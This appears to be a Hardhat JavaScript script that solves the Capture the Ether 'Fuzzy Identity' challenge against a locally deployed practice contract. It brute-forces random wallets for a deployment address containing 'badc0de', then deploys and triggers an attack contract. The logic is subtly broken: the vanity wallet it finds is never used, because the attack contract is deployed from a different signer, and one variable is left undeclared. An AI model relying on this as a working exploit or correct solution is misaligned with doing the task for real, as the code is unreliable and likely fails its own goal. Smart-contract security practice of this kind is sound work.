const { BigNumber } = require("ethers");
const { ethers } = require("hardhat");

async function main() {
  const [deployer, attacker] = await hre.ethers.getSigners();
  const MainContract = await ethers.getContractFactory("FuzzyIdentityChallenge", deployer);
  const mainContract = await MainContract.deploy();

  let wallet,
    count = 0;
  while (true) {
    wallet = ethers.Wallet.createRandom();
    contractAddress = ethers.utils.getContractAddress({
      from: wallet.address,
      nonce: BigNumber.from("0"), // First deployed contract with this address
    });

    if (contractAddress.toLowerCase().includes("badc0de")) {
      break;
    }

    count++;
    console.log(count);
  }

  const HackContract = await ethers.getContractFactory("FuzzyIdentityAttack", attacker);
  const hackContract = await HackContract.deploy(mainContract.address);

  await hackContract.connect(attacker).attack();
  console.log("IS COMPLETE:", await mainContract.isComplete());
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
